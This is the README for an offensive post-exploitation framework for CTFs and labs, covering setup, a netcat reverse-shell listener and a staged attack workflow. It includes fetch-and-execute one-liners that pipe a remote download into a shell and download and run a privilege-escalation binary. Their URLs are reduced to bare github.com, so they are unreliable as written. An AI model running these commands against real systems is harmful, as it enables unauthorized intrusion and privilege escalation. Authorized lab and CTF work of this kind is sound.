# Sectumsempra v1.0

**Sectumsempra** is an automated attack execution and post exploitation framework engineered for CTFs, labs, and authorized assessments, designed to immediately weaponize the findings provided by the NetWeave reconnaissance engine.

```text
TARGET ──► ATTACK PATH ──► FOOTHOLD PAYLOAD ──► REVERSE SHELL ──► PRIVILEGE ESCALATION
```

## Deployment

### 1. Clone & Setup
```bash
git clone https://github.com/danielissaq/Sectumsempra.git
cd Sectumsempra
```

### 2. Set up Python
```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install netifaces
```

### 3. Verify Attack Interface
Sectumsempra tracks local network topology to bind your listening interface. It will automatically prioritize your active TryHackMe VPN tunnel (`tun0`), but will seamlessly fall back to your local LAN/WLAN interface IP layout if no tunnel is detected:
```bash
ip a show tun0
```

## Complete Attack Workflow

### 1. Recon Sequence (Primary Terminal Tab)
Launch your reconnaissance infrastructure against the target machine using NetWeave:
```bash
python pwn_recon.py
```
Isolate the optimal entry point provided under the generated `GOLDEN PATH` analysis output block.

### 2. Payload Sequence (Second Terminal Tab)
Open a new terminal tab, navigate into your local repository workspace, and compile your custom staging shell sequences:
```bash
cd ~/Sectumsempra
source .venv/bin/activate
python3 sectumsempra.py
```
Input the targeted remote host IP address and assign your incoming listener port when prompted.

### 3. Listener Sequence (Third Terminal Tab)
Before executing any attack payloads on the target system, open a separate terminal tab and open your incoming port handler to receive the reverse connection loop:
```bash
nc -lvnp 4444
```

### 4. Post Exploitation Sequence (Active Shell Tab)
Execute the payload script compiled by Sectumsempra against the target vulnerability vector discovered during the NetWeave phase. Once the active connection drops back into your waiting Netcat listener tab, copy and execute the embedded automated privilege escalation engine:

**For Linux Targets (LinPEAS Live Memory Stager):**
```bash
curl -sL https://github.com | sh
```

**For Windows Targets (WinPEAS Live PowerShell Memory Stager):**
```powershell
iwr https://github.com -OutFile winpeas.exe; .\winpeas.exe
```

## Generated Payload
Sectumsempra immediately processes your parameter inputs to output standalone multi-platform execution arrays inside your working path:
```text
sectum_linux_strike_<target>.sh
sectum_win_strike_<target>.ps1
```

## Requirements
```text
Python 3.10+
netifaces library
Netcat listener backend
```

## Legal Notice
For authorized assessments and labs only against systems you have explicit permission to test.
